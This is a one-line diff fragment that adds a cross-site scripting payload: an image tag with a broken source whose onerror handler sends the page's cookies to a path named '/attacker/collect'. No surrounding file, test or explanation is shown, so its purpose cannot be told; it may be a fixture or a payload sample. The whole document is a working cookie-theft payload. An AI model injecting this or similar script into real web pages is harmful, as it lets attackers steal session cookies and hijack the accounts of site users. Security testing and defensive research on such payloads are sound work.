@@ -1,0 +1,1 @@
+<img src=x onerror="fetch('/attacker/collect?d='+encodeURIComponent('COOKIE:['+document.cookie+']'))">
